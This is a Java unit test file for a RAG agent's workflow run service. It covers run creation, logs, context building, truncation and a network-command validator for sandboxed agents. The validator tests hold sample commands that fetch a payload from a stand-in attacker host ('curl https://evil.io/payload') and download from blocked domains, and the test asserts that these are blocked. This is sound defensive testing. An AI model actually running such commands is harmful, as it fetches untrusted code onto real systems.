package com.ragagent.workflow;

import com.ragagent.auth.service.EmailService;
import com.ragagent.config.ChatModelFactory;
import com.ragagent.config.LlmProperties;
import com.ragagent.model.ModelConfigService;
import com.ragagent.sandbox.SandboxService;
import com.ragagent.skill.SkillService;
import com.ragagent.webfetch.WebFetchService;
import com.ragagent.workflow.entity.WorkflowRun;
import com.ragagent.workflow.entity.WorkflowRunLog;
import com.ragagent.workflow.repository.WorkflowAgentRepository;
import com.ragagent.workflow.repository.WorkflowRunLogRepository;
import com.ragagent.workflow.repository.WorkflowRunRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.ai.chat.client.ChatClient;

import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class WorkflowRunServiceTest {

    @Mock WorkflowRunRepository    runRepo;
    @Mock WorkflowRunLogRepository logRepo;
    @Mock WorkflowAgentRepository  agentRepo;
    @Mock WorkflowService          workflowService;
    @Mock SandboxService           sandboxService;
    @Mock WebFetchService          webFetchService;
    @Mock SkillService             skillService;
    @Mock ChatClient               chatClient;
    @Mock ChatModelFactory         chatModelFactory;
    @Mock ModelConfigService       modelConfigService;
    @Mock LlmProperties            llmProperties;
    @Mock EmailService             emailService;

    WorkflowRunService service;

    @BeforeEach
    void setUp() {
        service = new WorkflowRunService(
                runRepo, logRepo, agentRepo, workflowService, sandboxService,
                webFetchService, skillService, chatClient, chatModelFactory,
                modelConfigService, llmProperties, emailService);
    }

    // ── startRun ──────────────────────────────────────────────────────────────

    @Test
    void startRun_savesRunWithCorrectFields() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        service.startRun("wf-1", "Do something", "owner@test.com", false);

        ArgumentCaptor<WorkflowRun> captor = ArgumentCaptor.forClass(WorkflowRun.class);
        verify(runRepo, atLeastOnce()).save(captor.capture());

        WorkflowRun initial = captor.getAllValues().stream()
                .filter(r -> r.getStatus() == WorkflowRun.RunStatus.PENDING)
                .findFirst()
                .orElseThrow(() -> new AssertionError("No PENDING run saved"));

        assertThat(initial.getWorkflowId()).isEqualTo("wf-1");
        assertThat(initial.getUserInput()).isEqualTo("Do something");
        assertThat(initial.getOwnerEmail()).isEqualTo("owner@test.com");
        assertThat(initial.getId()).isNotBlank();
    }

    @Test
    void startRun_returnedIdMatchesSavedRunId() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        String runId = service.startRun("wf-1", "input", "user@test.com", false);

        ArgumentCaptor<WorkflowRun> captor = ArgumentCaptor.forClass(WorkflowRun.class);
        verify(runRepo, atLeastOnce()).save(captor.capture());

        boolean matchFound = captor.getAllValues().stream()
                .anyMatch(r -> runId.equals(r.getId()));
        assertThat(matchFound).isTrue();
    }

    @Test
    void startRun_eachCallGeneratesUniqueRunId() {
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        String id1 = service.startRun("wf-1", "task A", "user@test.com", false);
        String id2 = service.startRun("wf-1", "task B", "user@test.com", false);

        assertThat(id1).isNotEqualTo(id2);
    }

    // ── getRuns ───────────────────────────────────────────────────────────────

    @Test
    void getRuns_delegatesToRepository() {
        WorkflowRun run = new WorkflowRun("r1", "wf-1", "owner@test.com", "input");
        when(runRepo.findByWorkflowIdOrderByStartedAtDesc("wf-1")).thenReturn(List.of(run));

        List<WorkflowRun> result = service.getRuns("wf-1");

        assertThat(result).containsExactly(run);
        verify(runRepo).findByWorkflowIdOrderByStartedAtDesc("wf-1");
    }

    @Test
    void getRuns_noRuns_returnsEmptyList() {
        when(runRepo.findByWorkflowIdOrderByStartedAtDesc("wf-empty")).thenReturn(List.of());

        assertThat(service.getRuns("wf-empty")).isEmpty();
    }

    // ── getLogs ───────────────────────────────────────────────────────────────

    @Test
    void getLogs_delegatesToRepository() {
        WorkflowRunLog log = new WorkflowRunLog("r1", null, null,
                WorkflowRunLog.LogType.SYSTEM, "Workflow started");
        when(logRepo.findByRunIdOrderByCreatedAt("r1")).thenReturn(List.of(log));

        List<WorkflowRunLog> result = service.getLogs("r1");

        assertThat(result).containsExactly(log);
        verify(logRepo).findByRunIdOrderByCreatedAt("r1");
    }

    @Test
    void getLogs_noLogs_returnsEmptyList() {
        when(logRepo.findByRunIdOrderByCreatedAt("r-none")).thenReturn(List.of());

        assertThat(service.getLogs("r-none")).isEmpty();
    }

    // ── validateNetworkCommand ────────────────────────────────────────────────

    @Test
    void validateNetworkCommand_plainCommand_allowed() throws Exception {
        assertThat(callValidate("echo hello world", "owner@test.com")).isNull();
    }

    @Test
    void validateNetworkCommand_pythonScript_allowed() throws Exception {
        assertThat(callValidate("python3 main.py", "owner@test.com")).isNull();
    }

    @Test
    void validateNetworkCommand_curlToAllowedDomain_allowed() throws Exception {
        when(webFetchService.isUrlAllowed("https://api.example.com/data", "owner@test.com"))
                .thenReturn(true);

        assertThat(callValidate("curl https://api.example.com/data", "owner@test.com")).isNull();
    }

    @Test
    void validateNetworkCommand_curlToBlockedDomain_returnsBlockedMessage() throws Exception {
        when(webFetchService.isUrlAllowed("https://evil.io/payload", "owner@test.com"))
                .thenReturn(false);

        String result = callValidate("curl https://evil.io/payload", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("evil.io");
        assertThat(result).contains("whitelist");
    }

    @Test
    void validateNetworkCommand_wgetToBlockedDomain_returnsBlockedMessage() throws Exception {
        when(webFetchService.isUrlAllowed("https://blocked.net/file.zip", "owner@test.com"))
                .thenReturn(false);

        String result = callValidate("wget https://blocked.net/file.zip", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("blocked.net");
    }

    @Test
    void validateNetworkCommand_curlWithNoUrl_returnsBlockedMessage() throws Exception {
        String result = callValidate("curl --help", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("without a recognizable URL");
    }

    @Test
    void validateNetworkCommand_wgetWithNoUrl_returnsBlockedMessage() throws Exception {
        String result = callValidate("wget --spider", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
    }

    @Test
    void validateNetworkCommand_multipleCurlUrls_blockedIfAnyNotAllowed() throws Exception {
        when(webFetchService.isUrlAllowed("https://ok.com", "owner@test.com")).thenReturn(true);
        when(webFetchService.isUrlAllowed("https://bad.com", "owner@test.com")).thenReturn(false);

        String result = callValidate("curl https://ok.com && curl https://bad.com", "owner@test.com");

        assertThat(result).startsWith("[Blocked:");
        assertThat(result).contains("bad.com");
    }

    // ── buildContext ──────────────────────────────────────────────────────────

    @Test
    void buildContext_singleMessage_returnsContentDirectly() throws Exception {
        List<Map<String, String>> messages = List.of(
                Map.of("role", "user", "content", "What is RAG?"));

        assertThat(callBuildContext(messages)).isEqualTo("What is RAG?");
    }

    @Test
    void buildContext_multipleMessages_includesRoleHeaders() throws Exception {
        List<Map<String, String>> messages = List.of(
                Map.of("role", "user",      "content", "Tell me about Java"),
                Map.of("role", "assistant", "content", "Java is a language"));

        String result = callBuildContext(messages);

        assertThat(result).contains("[USER]");
        assertThat(result).contains("[ASSISTANT]");
        assertThat(result).contains("Tell me about Java");
        assertThat(result).contains("Java is a language");
    }

    @Test
    void buildContext_multipleMessages_roleIsUppercased() throws Exception {
        List<Map<String, String>> messages = List.of(
                Map.of("role", "user", "content", "q1"),
                Map.of("role", "user", "content", "q2"));

        String result = callBuildContext(messages);

        assertThat(result).contains("[USER]");
        assertThat(result).doesNotContain("[user]");
    }

    // ── truncate ──────────────────────────────────────────────────────────────

    @Test
    void truncate_shortString_returnsUnchanged() throws Exception {
        assertThat(callTruncate("hello", 100)).isEqualTo("hello");
    }

    @Test
    void truncate_stringExactlyAtLimit_returnsUnchanged() throws Exception {
        assertThat(callTruncate("abcde", 5)).isEqualTo("abcde");
    }

    @Test
    void truncate_longString_cutsAtLimitAndAddsEllipsis() throws Exception {
        assertThat(callTruncate("abcdefghij", 5)).isEqualTo("abcde…");
    }

    @Test
    void truncate_nullInput_returnsLiteralNullString() throws Exception {
        assertThat(callTruncate(null, 10)).isEqualTo("null");
    }

    // ── reflection helpers ────────────────────────────────────────────────────

    private String callValidate(String command, String email) throws Exception {
        Method m = WorkflowRunService.class.getDeclaredMethod(
                "validateNetworkCommand", String.class, String.class);
        m.setAccessible(true);
        return (String) m.invoke(service, command, email);
    }

    @SuppressWarnings("unchecked")
    private String callBuildContext(List<Map<String, String>> messages) throws Exception {
        Method m = WorkflowRunService.class.getDeclaredMethod("buildContext", List.class);
        m.setAccessible(true);
        return (String) m.invoke(service, messages);
    }

    private String callTruncate(String s, int max) throws Exception {
        Method m = WorkflowRunService.class.getDeclaredMethod(
                "truncate", String.class, int.class);
        m.setAccessible(true);
        return (String) m.invoke(service, s, max);
    }
}
